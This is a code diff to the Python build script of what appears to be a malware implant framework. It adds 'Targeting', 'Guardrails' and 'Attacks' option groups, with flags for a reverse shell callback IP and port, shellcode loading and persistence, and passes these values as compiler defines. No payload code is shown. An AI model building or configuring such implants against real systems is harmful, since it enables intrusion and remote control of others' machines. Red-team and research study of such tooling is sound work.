@@ -19,6 +19,7 @@ implant_c_path = "test.c"
 
 parser = argparse.ArgumentParser("python compiler.py", usage='%(prog)s [-o fileName] [-p listener] [-intfc eth0] [-act SECRET_PORTS] [-key 200,300,400] [-atkSc] [-a x64] [-p linux] [-ip 192.160.1.100] [-revip 192.168.2.132] [-revport 1337] [-strip]')
 
+##### Targeting #####
 parser.add_argument("-d", "--debug", action="store_true",
         help="compile with debugging")
 parser.add_argument("-ip", "--ipAddress",type=str,
@@ -29,6 +30,8 @@ parser.add_argument("-do", "--domain", type=str,
 parser.add_argument("-p", "--platform",type=str, metavar='',
         help="platform", default="unknown")
 """
+
+##### Guardrails #####
 parser.add_argument("-a", "--architecture",type=str, metavar='', 
         help="system architecture", default="unknown")
 parser.add_argument("-os", "--os",type=str, metavar='',
@@ -43,6 +46,14 @@ parser.add_argument("-eg", "--execguardrails", type=str, metavar='',
         help="execution guardrails", default="unknown")
 parser.add_argument("-pm", "--persistmech", type=str, metavar='',
         help="persistence mechanism", default="unknown")
+
+##### Attacks #####
+parser.add_argument("-atkR", "--reverseShell",action="store_true", 
+        help="run a reverse shell")
+parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
+        help="reverse shell callback IP")  
+parser.add_argument("-revport", "--reversePort",type=str, metavar='',
+        help="reverse shell Port")
 
 """
 parser.add_argument("-vn", "--versionNumber",type=str, metavar='',
@@ -72,13 +83,7 @@ parser.add_argument("-atkD", "--downloadURL",type=str, metavar='',
 parser.add_argument("-atkB", "--bang", action="store_true", 
         help="execute bang attack function")
 parser.add_argument("-atkSc", "--loadShellcode", action="store_true", 
-        help="execute shellcode")
-parser.add_argument("-atkR", "--reverseShell",action="store_true", 
-        help="run a reverse shell")
-parser.add_argument("-revip", "--reverseIP",type=str, metavar='',
-        help="reverse shell IP")  
-parser.add_argument("-revport", "--reversePort",type=str, metavar='',
-        help="reverse shell Port")                     
+        help="execute shellcode")                     
 parser.add_argument("-per", "--persistence",type=str, metavar='',
         help="persistence mechanism (not implemented)") 
 parser.add_argument("-notes", "--notes",type=str, metavar='',
@@ -109,6 +114,13 @@ if args.debug:
 
 if args.ipAddress != "unknown":
     cmdString.insert(1, "-D IPNUM=\"" +(args.ipAddress)+ "\"")
+    
+    
+if args.reverseIP != "unknown":
+    cmdString.insert(1, "-D REVIP=\"" +(args.reverseIP)+ "\"")
+if args.port != "unknown":
+    cmdString.insert(1, "-D PORT=\"" +(args.port)+ "\"")
+
 
 if args.architecture != "unknown":
     cmdString.insert(1, "-D ARCH=\"" +(args.architecture)+ "\"")
